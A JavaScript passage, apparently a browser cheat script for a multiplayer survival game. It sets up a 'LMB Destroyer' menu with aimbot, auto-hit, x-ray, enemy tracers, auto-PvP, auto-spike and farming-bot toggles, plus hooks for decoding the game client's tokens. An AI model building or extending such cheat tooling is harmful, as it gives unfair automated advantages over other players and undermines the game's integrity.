  let oldDist_water = undefined;
  let isPullingDiving = false;
  const languages = {
    English: "en",
    Vietnamese: "vi",
    ["Chinese (Simplified)"]: "zh-CN",
    ["Chinese (Traditional)"]: "zh-TW",
    Japanese: "ja",
    Korean: "ko",
    French: "fr",
    German: "de",
    Spanish: "es",
    Russian: "ru",
    Italian: "it",
    Portuguese: "pt",
    Thai: "th",
    Arabic: "ar",
    Hindi: "hi",
    Indonesian: "id",
    Turkish: "tr"
  };
  let IsSomeOneDied = false;
  let OldDir = 0;
  let oldUserDir = 0;
  let IsPullingBook = false;
  let autoCameraControlActive = false;
  let deletedUids = [];
  let cameraUpdateStep = 0;
  let lastEatTime = performance.now();
  let lastDrinkTime = performance.now();
  let chestsForAutoPut = {};
  let putFireTime = performance.now();
  let __p_d8ju_JoinLeave_Join = [];
  let __p_d8ju_JoinLeave_Leave = [];
  let __p_d8ju_JoinLeave_toggle1 = false;
  let __p_d8ju_JoinLeave_toggle2 = false;
  let __p_d8ju_JoinLeave_toggle11 = false;
  let __p_d8ju_JoinLeave_toggle22 = false;
  let chestsForCraftBot = {};
  let reiditeSpikeCrafterTakeFoodLastTime = performance.now();
  let reiditeSpikeCrafterTakeResLastTime = performance.now();
  let sowSeedLastTime = performance.now();
  let useHammerLastTime = performance.now();
  let useHelmetLastTime = performance.now();
  let useCrownOfLifeLastTime = performance.now();
  let oldRight = null;
  let isInCrafting = false;
  let incomingRight = null;
  let isCheckingHealthForAutoBottle = false;
  let sandstormImage = new Image();
  sandstormImage.src = "https://raw.githubusercontent.com/XmreLoux/images/main/sandstorm.png";
  let blizzardImage = new Image();
  blizzardImage.src = "https://raw.githubusercontent.com/XmreLoux/images/main/blizzard.png";
  let isPullingPilot = false;
  let isCantHealInBlizzardStartTime = performance.now();
  let isWaitPutChest = false;
  let antiHoodTime = performance.now();
  let clotheToUseWhenDoneCraft = null;
  let IncomingClothe = null;
  let TotemCoor = null;
  let AutoTameIsWaiting = false;
  let isWaitToPutSpikeInWater = false;
  let timeoutInvId = null;
  let healTimestamps = {};
  let autoBuyWoodLastSent = performance.now();
  let autoBuyAllStoneLastSent = performance.now();
  let autoBuyAllGoldLastSent = performance.now();
  let isClickingGUI = false;
  let buildLimit = 0;
  const AutoEme_farmLocations = [{
    x: 21462,
    y: 27880
  }, {
    x: 21469,
    y: 28250
  }, {
    x: 21084,
    y: 28253
  }];
  let AutoEme_currentIndex = 0;
  let AutoEme_angle = null;
  let AutoEme_isFarming = false;
  let AutoEme_usePickLastTime = performance.now();
  let temp = {
    key_text: "",
    reply_text: "",
    xTemp: 0,
    yTemp: 0,
    forText: {
      lineWidth: 3,
      sizeText: 30
    },
    max: 10,
    min: -10,
    x1: 0,
    y1: 0,
    x2: 0,
    y2: 0,
    x3: 0,
    y3: 0,
    x4: 0,
    y4: 0,
    invIdToPut: 0,
    invIdToTake: 0,
    radius: 10,
    opacity: 0.75,
    takeChestPidToAdd: 0,
    takeChestIdToAdd: 0,
    putChestInvIdToAdd: 0,
    putChestPidToAdd: 0,
    putChestIdToAdd: 0,
    autopvpLockId: 0,
    smartCraft: {
      mode: INV.REIDITE_SPIKE,
      amount: 100
    }
  };
  let dist_waterKey;
  let dist_desertKey;
  let world;
  let game;
  let client;
  let user;
  let mouse;
  let ui;
  let keyboard;
  let can;
  let ctx;
  let canw;
  let canh;
  let canw2;
  let canh2;
  let canm;
  let delta = 0;
  let old_timestamp = performance.now();
  let scale = 1;
  let ratio = 1;
  let ratio_opt = -1;
  let decodeFunction = null;
  let userDecodeToken1Key;
  let userDecodeToken2Key;
  let privateSymbol = Symbol();
  let EncodeDict = {};
  let LMB_SERVER_URL = "ws://localhost:8000/ws";
  let lmbClient = new LMBNetworkClient();
  let hpFromServer = {};
  function updateObjectProperties(_param_476, _param_477) {
    const targetKeys = Object.keys(_param_476);
    _param_477.forEach(({
      key: key,
      apply: condition
    }) => {
      const index = targetKeys.findIndex((targetKey, idx) => {
        return condition(_param_476[targetKey], idx);
      });
      if (index !== -1) {
        const findedTargetKey = targetKeys[index];
        Object.defineProperty(_param_476, key, {
          get() {
            return this[findedTargetKey];
          },
          set(value) {
            this[findedTargetKey] = value;
          }
        });
      } else {
        console.log("Cannot extract: " + key + " from ", _param_476);
      }
    });
  }
  function findFirstObject(_param_480, _param_481) {
    let _var_600 = 0;
    for (const key in _param_480) {
      if (Object.prototype.hasOwnProperty.call(_param_480, key)) {
        const value = _param_480[key];
        if (_param_481(value, _var_600)) {
          return value;
        }
      }
      _var_600++;
    }
    return undefined;
  }
  const guiTheme = {
    Default: "\n    :root {\n      --tp-base-background-color: hsla(230, 7%, 17%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(230, 7%, 70%, 1.00);\n      --tp-button-background-color-active: hsla(230, 7%, 85%, 1.00);\n      --tp-button-background-color-focus: hsla(230, 7%, 80%, 1.00);\n      --tp-button-background-color-hover: hsla(230, 7%, 75%, 1.00);\n      --tp-button-foreground-color: hsla(230, 7%, 17%, 1.00);\n      --tp-container-background-color: hsla(230, 7%, 75%, 0.10);\n      --tp-container-background-color-active: hsla(230, 7%, 75%, 0.25);\n      --tp-container-background-color-focus: hsla(230, 7%, 75%, 0.20);\n      --tp-container-background-color-hover: hsla(230, 7%, 75%, 0.15);\n      --tp-container-foreground-color: hsla(230, 7%, 75%, 1.00);\n      --tp-groove-foreground-color: hsla(230, 7%, 75%, 0.10);\n      --tp-input-background-color: hsla(230, 7%, 75%, 0.10);\n      --tp-input-background-color-active: hsla(230, 7%, 75%, 0.25);\n      --tp-input-background-color-focus: hsla(230, 7%, 75%, 0.20);\n      --tp-input-background-color-hover: hsla(230, 7%, 75%, 0.15);\n      --tp-input-foreground-color: hsla(230, 7%, 75%, 1.00);\n      --tp-label-foreground-color: hsla(230, 7%, 75%, 0.70);\n      --tp-monitor-background-color: hsla(230, 7%, 0%, 0.20);\n      --tp-monitor-foreground-color: hsla(230, 7%, 75%, 0.70);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + Settings.Gui.fontSize + "px !important;\n    }\n  ",
    Iceberg: "\n    :root {\n      --tp-base-background-color: hsla(230, 20%, 11%, 1);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(230, 10%, 80%, 1);\n      --tp-button-background-color-active: hsla(230, 10%, 95%, 1);\n      --tp-button-background-color-focus: hsla(230, 10%, 90%, 1);\n      --tp-button-background-color-hover: hsla(230, 10%, 85%, 1);\n      --tp-button-foreground-color: hsla(230, 20%, 11%, 1);\n      --tp-container-background-color: hsla(230, 25%, 16%, 1);\n      --tp-container-background-color-active: hsla(230, 25%, 31%, 1);\n      --tp-container-background-color-focus: hsla(230, 25%, 26%, 1);\n      --tp-container-background-color-hover: hsla(230, 25%, 21%, 1);\n      --tp-container-foreground-color: hsla(230, 10%, 80%, 1);\n      --tp-groove-foreground-color: hsla(230, 25%, 16%, 1);\n      --tp-input-background-color: hsla(230, 20%, 8%, 1);\n      --tp-input-background-color-active: hsla(230, 28%, 23%, 1);\n      --tp-input-background-color-focus: hsla(230, 28%, 18%, 1);\n      --tp-input-background-color-hover: hsla(230, 20%, 13%, 1);\n      --tp-input-foreground-color: hsla(230, 10%, 80%, 1);\n      --tp-label-foreground-color: hsla(230, 12%, 48%, 1);\n      --tp-monitor-background-color: hsla(230, 20%, 8%, 1);\n      --tp-monitor-foreground-color: hsla(230, 12%, 48%, 1);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + Settings.Gui.fontSize + "px !important;\n    }\n  ",
    Jetblack: "\n    :root {\n      --tp-base-background-color: hsla(0, 0%, 0%, 1);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(0, 0%, 70%, 1);\n      --tp-button-background-color-active: hsla(0, 0%, 85%, 1);\n      --tp-button-background-color-focus: hsla(0, 0%, 80%, 1);\n      --tp-button-background-color-hover: hsla(0, 0%, 75%, 1);\n      --tp-button-foreground-color: hsla(0, 0%, 0%, 1);\n      --tp-container-background-color: hsla(0, 0%, 10%, 1);\n      --tp-container-background-color-active: hsla(0, 0%, 25%, 1);\n      --tp-container-background-color-focus: hsla(0, 0%, 20%, 1);\n      --tp-container-background-color-hover: hsla(0, 0%, 15%, 1);\n      --tp-container-foreground-color: hsla(0, 0%, 50%, 1);\n      --tp-groove-foreground-color: hsla(0, 0%, 10%, 1);\n      --tp-input-background-color: hsla(0, 0%, 10%, 1);\n      --tp-input-background-color-active: hsla(0, 0%, 25%, 1);\n      --tp-input-background-color-focus: hsla(0, 0%, 20%, 1);\n      --tp-input-background-color-hover: hsla(0, 0%, 15%, 1);\n      --tp-input-foreground-color: hsla(0, 0%, 70%, 1);\n      --tp-label-foreground-color: hsla(0, 0%, 50%, 1);\n      --tp-monitor-background-color: hsla(0, 0%, 8%, 1);\n      --tp-monitor-foreground-color: hsla(0, 0%, 48%, 1);\n    }\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + Settings.Gui.fontSize + "px !important;\n    }\n  ",
    Light: "\n    :root {\n      --tp-base-background-color: hsla(230, 5%, 90%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.10);\n      --tp-button-background-color: hsla(230, 7%, 75%, 1.00);\n      --tp-button-background-color-active: hsla(230, 7%, 60%, 1.00);\n      --tp-button-background-color-focus: hsla(230, 7%, 65%, 1.00);\n      --tp-button-background-color-hover: hsla(230, 7%, 70%, 1.00);\n      --tp-button-foreground-color: hsla(230, 10%, 30%, 1.00);\n      --tp-container-background-color: hsla(230, 15%, 30%, 0.20);\n      --tp-container-background-color-active: hsla(230, 15%, 30%, 0.32);\n      --tp-container-background-color-focus: hsla(230, 15%, 30%, 0.28);\n      --tp-container-background-color-hover: hsla(230, 15%, 30%, 0.24);\n      --tp-container-foreground-color: hsla(230, 10%, 30%, 1.00);\n      --tp-groove-foreground-color: hsla(230, 15%, 30%, 0.20);\n      --tp-input-background-color: hsla(230, 15%, 30%, 0.10);\n      --tp-input-background-color-active: hsla(230, 15%, 30%, 0.22);\n      --tp-input-background-color-focus: hsla(230, 15%, 30%, 0.18);\n      --tp-input-background-color-hover: hsla(230, 15%, 30%, 0.14);\n      --tp-input-foreground-color: hsla(230, 10%, 30%, 1.00);\n      --tp-label-foreground-color: hsla(230, 10%, 30%, 0.70);\n      --tp-monitor-background-color: hsla(230, 15%, 30%, 0.10);\n      --tp-monitor-foreground-color: hsla(230, 10%, 30%, 0.50);\n    }\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + Settings.Gui.fontSize + "px !important;\n    }\n  ",
    Retro: "\n    :root {\n      --tp-base-background-color: hsla(40, 3%, 90%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.30);\n      --tp-button-background-color: hsla(40, 3%, 70%, 1.00);\n      --tp-button-background-color-active: hsla(40, 3%, 55%, 1.00);\n      --tp-button-background-color-focus: hsla(40, 3%, 60%, 1.00);\n      --tp-button-background-color-hover: hsla(40, 3%, 65%, 1.00);\n      --tp-button-foreground-color: hsla(40, 3%, 20%, 1.00);\n      --tp-container-background-color: hsla(40, 3%, 70%, 1.00);\n      --tp-container-background-color-active: hsla(40, 3%, 55%, 1.00);\n      --tp-container-background-color-focus: hsla(40, 3%, 60%, 1.00);\n      --tp-container-background-color-hover: hsla(40, 3%, 65%, 1.00);\n      --tp-container-foreground-color: hsla(40, 3%, 20%, 1.00);\n      --tp-groove-foreground-color: hsla(40, 3%, 70%, 1.00);\n      --tp-input-background-color: hsla(120, 3%, 20%, 1.00);\n      --tp-input-background-color-active: hsla(120, 3%, 35%, 1.00);\n      --tp-input-background-color-focus: hsla(120, 3%, 30%, 1.00);\n      --tp-input-background-color-hover: hsla(120, 3%, 25%, 1.00);\n      --tp-input-foreground-color: hsla(120, 40%, 60%, 1.00);\n      --tp-label-foreground-color: hsla(40, 3%, 50%, 1.00);\n      --tp-monitor-background-color: hsla(120, 3%, 20%, 1.00);\n      --tp-monitor-foreground-color: hsla(120, 40%, 60%, 0.80);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + Settings.Gui.fontSize + "px !important;\n    }\n  ",
    Translucent: "\n    :root {\n      --tp-base-background-color: hsla(0, 0%, 10%, 0.80);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(0, 0%, 80%, 1.00);\n      --tp-button-background-color-active: hsla(0, 0%, 100%, 1.00);\n      --tp-button-background-color-focus: hsla(0, 0%, 95%, 1.00);\n      --tp-button-background-color-hover: hsla(0, 0%, 85%, 1.00);\n      --tp-button-foreground-color: hsla(0, 0%, 0%, 0.80);\n      --tp-container-background-color: hsla(0, 0%, 0%, 0.30);\n      --tp-container-background-color-active: hsla(0, 0%, 0%, 0.60);\n      --tp-container-background-color-focus: hsla(0, 0%, 0%, 0.50);\n      --tp-container-background-color-hover: hsla(0, 0%, 0%, 0.40);\n      --tp-container-foreground-color: hsla(0, 0%, 100%, 0.50);\n      --tp-groove-foreground-color: hsla(0, 0%, 0%, 0.30);\n      --tp-input-background-color: hsla(0, 0%, 0%, 0.30);\n      --tp-input-background-color-active: hsla(0, 0%, 0%, 0.60);\n      --tp-input-background-color-focus: hsla(0, 0%, 0%, 0.50);\n      --tp-input-background-color-hover: hsla(0, 0%, 0%, 0.40);\n      --tp-input-foreground-color: hsla(0, 0%, 100%, 0.50);\n      --tp-label-foreground-color: hsla(0, 0%, 100%, 0.50);\n      --tp-monitor-background-color: hsla(0, 0%, 0%, 0.30);\n      --tp-monitor-foreground-color: hsla(0, 0%, 100%, 0.30);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + Settings.Gui.fontSize + "px !important;\n    }\n  ",
    Vivid: "\n    :root {\n      --tp-base-background-color: hsla(0, 80%, 40%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(0, 0%, 100%, 1.00);\n      --tp-button-background-color-active: hsla(0, 0%, 85%, 1.00);\n      --tp-button-background-color-focus: hsla(0, 0%, 90%, 1.00);\n      --tp-button-background-color-hover: hsla(0, 0%, 95%, 1.00);\n      --tp-button-foreground-color: hsla(230, 20%, 11%, 1.00);\n      --tp-container-background-color: hsla(0, 0%, 0%, 0.20);\n      --tp-container-background-color-active: hsla(0, 0%, 0%, 0.35);\n      --tp-container-background-color-focus: hsla(0, 0%, 0%, 0.30);\n      --tp-container-background-color-hover: hsla(0, 0%, 0%, 0.25);\n      --tp-container-foreground-color: hsla(0, 0%, 100%, 0.90);\n      --tp-groove-foreground-color: hsla(0, 0%, 0%, 0.20);\n      --tp-input-background-color: hsla(0, 0%, 0%, 0.50);\n      --tp-input-background-color-active: hsla(0, 0%, 0%, 0.65);\n      --tp-input-background-color-focus: hsla(0, 0%, 0%, 0.60);\n      --tp-input-background-color-hover: hsla(0, 0%, 0%, 0.55);\n      --tp-input-foreground-color: hsla(0, 0%, 100%, 0.90);\n      --tp-label-foreground-color: hsla(0, 0%, 100%, 0.90);\n      --tp-monitor-background-color: hsla(0, 0%, 0%, 0.50);\n      --tp-monitor-foreground-color: hsla(0, 0%, 100%, 0.50);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + Settings.Gui.fontSize + "px !important;\n    }\n  "
  };
  function adjustContainer() {
    const dpr = window.devicePixelRatio;
    const scaleFactor = 1 / dpr;
    const right = "" + 10 / dpr + "px";
    const container = document.getElementById(guiContainerId);
    if (container) {
      Object.assign(container.style, {
        position: "absolute",
        top: "75px",
        right: right,
        width: "310px",
        cursor: "move",
        transform: "scale(" + scaleFactor * Settings.Gui.scale + ")",
        transformOrigin: "top right"
      });
    }
  }
  let gui;
  let guiControls = {};
  function generateUniqueId(length = 10) {
    let id = Math.random().toString(36).substr(2, length);
    do {} while (document.getElementById(id));
    return id;
  }
  let guiStyleId = generateUniqueId();
  let guiContainerId = generateUniqueId();
  let __p_JN2z_UtilsUI_initUI = () => {
    const container = document.createElement("div");
    container.addEventListener("mousedown", () => {
      isClickingGUI = true;
    });
    container.id = guiContainerId;
    document.body.appendChild(container);
    adjustContainer();
    window.addEventListener("resize", adjustContainer);
    {
      const style = document.createElement("style");
      style.id = guiStyleId;
      style.textContent = guiTheme[Settings.Gui.theme];
      document.head.appendChild(style);
    }
    gui = new Tweakpane.Pane({
      title: "LMB Destroyer v2.2.0 (add AutoEme)",
      container: container,
      expanded: true
    });
    {
      const toggleButton = document.createElement("button");
      toggleButton.id = "togglePaneButton";
      toggleButton.style.position = "fixed";
      toggleButton.style.top = "0px";
      toggleButton.style.right = "0px";
      toggleButton.style.width = "12px";
      toggleButton.style.height = "12px";
      toggleButton.style.backgroundColor = "green";
      toggleButton.style.color = "white";
      toggleButton.style.border = "none";
      toggleButton.style.cursor = "pointer";
      toggleButton.style.zIndex = "1001";
      toggleButton.style.borderBottomLeftRadius = "4px";
      document.body.appendChild(toggleButton);
      toggleButton.addEventListener("click", () => {
        gui.hidden = !gui.hidden;
      });
      window.addEventListener("keydown", _param_487 => {
        if (_param_487.code === Settings.Gui.k) {
          gui.hidden = !gui.hidden;
        }
      });
    }
    const visualsFolder = gui.addFolder({
      title: "🎨 Visuals",
      expanded: false
    });
    {
      const folder = visualsFolder;
      const guiFolder = folder.addFolder({
        title: "🪟 Gui",
        expanded: false
      });
      {
        const folder = guiFolder;
        folder.addBinding(Settings.Gui, "theme", {
          label: "Theme",
          options: {
            Default: "Default",
            Iceberg: "Iceberg",
            Jetblack: "Jetblack",
            Light: "Light",
            Retro: "Retro",
            Translucent: "Translucent",
            Vivid: "Vivid"
          }
        }).on("change", event => {
          const style = document.getElementById(guiStyleId);
          if (style) {
            style.textContent = guiTheme[Settings.Gui.theme];
          }
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Gui, "scale", {
          label: "Scale",
          format: v => {
            return v.toFixed(1);
          },
          readonly: true
        });
        folder.addButton({
          title: "Increase Scale",
          label: "+ Scale"
        }).on("click", () => {
          Settings.Gui.scale += 0.1;
          __p_JN2z_UtilsUI_saveSettings();
          adjustContainer();
        });
        folder.addButton({
          title: "Decrease Scale",
          label: "− Scale"
        }).on("click", () => {
          Settings.Gui.scale -= 0.1;
          __p_JN2z_UtilsUI_saveSettings();
          adjustContainer();
        });
        folder.addBinding(Settings.Gui, "fontSize", {
          label: "Font Size",
          min: 10,
          max: 25,
          step: 1
        }).on("change", event => {
          document.querySelectorAll(".tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv").forEach(_param_494 => {
            _param_494.style.setProperty("font-size", "" + Settings.Gui.fontSize + "px", "important");
          });
          __p_JN2z_UtilsUI_saveSettings();
        });
        const setKeyBindButton = folder.addButton({
          label: "KeyBind",
          title: Settings.Gui.k
        }).on("click", () => {
          __p_JN2z_UtilsUI_controls.setKeyBind("Gui", setKeyBindButton);
        });
      }
      const camFolder = folder.addFolder({
        title: "📷 Cam",
        expanded: false
      });
      {
        const folder = camFolder;
        const offset = folder.addBinding(Settings, "OffsetCam", {
          label: "offsetCam",
          x: {
            min: -1000,
            max: 1000,
            step: 10
          },
          y: {
            min: -1000,
            max: 1000,
            step: 10
          },
          picker: "inline",
          expanded: true
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
          client.update_cam(true);
        });
        camFolder.addButton({
          title: "RESET"
        }).on("click", () => {
          Settings.OffsetCam.x = 0;
          Settings.OffsetCam.y = 0;
          offset.refresh();
          __p_JN2z_UtilsUI_saveSettings();
          client.update_cam(true);
        });
      }
      folder.addBinding(Settings.ListEnabledHacks, "anchor", {
        options: {
          BottomLeft: "BottomLeft",
          TopLeft: "TopLeft"
        }
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings, "GaugesUI", {
        label: "GaugesUI",
        options: {
          new: "new",
          default: "default"
        }
      }).on("change", event => {
        if (event.value === "new") {
          game.gauges.img = mySprite[MY_SPRITE.NEW_GAUGES];
        } else if (game.gauges?.img && game.gauges?.defaultImg) {
          game.gauges.img = game.gauges.defaultImg;
        }
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.Roof, "opacity", {
        label: "Roof",
        min: 0.2,
        max: 0.9,
        step: 0.1
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings, "VehicleOpacity", {
        label: "Vehicle",
        min: 0.2,
        max: 1,
        step: 0.1
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      visualsFolder.addBinding(Settings.Xray, "opacity", {
        label: "Xray",
        min: 0.2,
        max: 0.9,
        step: 0.1
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      const xrayKeyBindButton = folder.addButton({
        label: "└─ KeyBind",
        title: Settings.Xray.k
      }).on("click", () => {
        __p_JN2z_UtilsUI_controls.setKeyBind("Xray", xrayKeyBindButton);
      });
      folder.addBinding(Settings.BigZoom, "e", {
        label: "BigZoom"
      }).on("change", _param_500 => {
        if (_param_500.value === false) {
          autoCameraControlActive = false;
          if (client.socket && client.socket.readyState === 1) {
            client.update_cam();
          }
        } else if (window.devicePixelRatio <= 0.5) {
          autoCameraControlActive = true;
        }
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.ShowRangeOfWeapon, "e", {
        label: "ShowRange"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.ShowMovement, "e", {
        label: "ShowMovement"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.ShowSpikeWarningCircle, "e", {
        label: "SpikeWarningCircle"
      }).on("change", event => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.FakeEnemyAimbot, "e", {
        label: "FakeEnemyAimbot"
      }).on("change", () => {
        __p_JN2z_UtilsUI_saveSettings();
      });
      folder.addBinding(Settings.MuteEnemyChat, "e", {
        label: "MuteEnemyChat"
      });
      const tracersFolder = folder.addFolder({
        title: "🧭 Tracers",
        expanded: true
      });
      {
        const folder = tracersFolder;
        folder.addBinding(Settings.Tracers.target, "teamate", {
          label: "Teammate 🤝"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "enemy", {
          label: "Enemy 👹"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "spider", {
          label: "Spider 🕷️"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "wolf", {
          label: "Wolf 🐺"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "rabbit", {
          label: "Rabbit 🐰"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "hawk", {
          label: "Hawk 🦅"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "kraken", {
          label: "Kraken 🐙"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "sandworm", {
          label: "SandWorm 🐛"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "lavadragon", {
          label: "LavaDragon 🐉"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.Tracers.target, "goldenchicken", {
          label: "GoldenChicken 🐔"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
      }
      const debugFolder = folder.addFolder({
        title: "🐞 Debug",
        expanded: false
      });
      {
        const folder = debugFolder;
        const masterControl = folder.addBinding(Settings.Debug, "e", {
          label: "Debug Enabled"
        });
        folder.addBinding(Settings.Debug, "fontSize", {
          label: "Font Size",
          min: 10,
          max: 24,
          step: 1
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        const childControls = [folder.addBlade({
          view: "separator"
        }), folder.addBinding(Settings.Debug, "showType", {
          label: "type"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "showPID", {
          label: "pid"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "showID", {
          label: "id"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "showInfo", {
          label: "info"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "showCoordinates", {
          label: "coor (X, Y)"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "showDistance", {
          label: "distance"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "showSpeed", {
          label: "speed"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBlade({
          view: "separator"
        }), folder.addBinding(Settings.Debug, "debugRoof", {
          title: "Roof"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "debugBridge", {
          title: "Bridge"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        }), folder.addBinding(Settings.Debug, "debugPlot", {
          title: "Plot"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        })];
        const updateChildControlStates = isEnabled => {
          childControls.forEach(control => {
            control.disabled = !isEnabled;
          });
        };
        masterControl.on("change", _param_505 => {
          updateChildControlStates(_param_505.value);
          __p_JN2z_UtilsUI_saveSettings();
        });
        updateChildControlStates(Settings.Debug.e);
      }
    }
    const combatFolder = gui.addFolder({
      title: "⚔️ Combat",
      expanded: false
    });
    {
      const aimbotFolder = combatFolder.addFolder({
        title: "🎯 Aimbot",
        expanded: false
      });
      const autospikeFolder = combatFolder.addFolder({
        title: "🌵 AutoSpike",
        expanded: false
      });
      const autowallFolder = combatFolder.addFolder({
        title: "🧱 AutoWall",
        expanded: false
      });
      const autopvpFolder = combatFolder.addFolder({
        title: "👾 AutoPvP",
        expanded: false
      });
      {
        aimbotFolder.addBinding(Settings.Aimbot, "e", {
          label: "Aimbot Enabled"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        const keyBindButton = aimbotFolder.addButton({
          title: Settings.Aimbot.k,
          label: "KeyBind"
        }).on("click", () => {
          __p_JN2z_UtilsUI_controls.setKeyBind("Aimbot", keyBindButton);
        });
        aimbotFolder.addBinding(Settings.Aimbot, "autoHit", {
          label: "AutoHit"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        aimbotFolder.addBinding(Settings.Aimbot, "isSmooth", {
          label: "isSmooth (visual)"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        aimbotFolder.addBinding(Settings.Aimbot, "isAimbotGoldenChicken", {
          label: "GoldenChikenAimbot"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        aimbotFolder.addBinding(Settings.Aimbot, "isAimbotRabbit", {
          label: "RabbitAimbot"
        }).on("change", event => {
          __p_JN2z_UtilsUI_saveSettings();
        });
      }
      {
        const folder = autospikeFolder;
        const keyBindButton = folder.addButton({
          title: Settings.AutoSpike.k,
          label: "KeyBind"
        }).on("click", () => {
          __p_JN2z_UtilsUI_controls.setKeyBind("AutoSpike", keyBindButton);
        });
        folder.addBinding(Settings.AutoSpike, "IsFollowMouse", {
          label: "MouseAngle"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        folder.addBinding(Settings.AutoSpike, "AngleSpread", {
          label: "AngleSpread"
        }).on("change", () => {
          __p_JN2z_UtilsUI_saveSettings();
        });
        if (!["Normal", "360"].includes(Settings.AutoSpike.angleSpreadMode)) {
          Settings.AutoSpike.angleSpreadMode = "Normal";
        }
        folder.addBinding(Settings.AutoSpike, "angleSpreadMode", {
          label: "└─ Mode",
          options: {
            Normal: "Normal",
            ["360"]: "360"
          }
        }).on("change", () => {
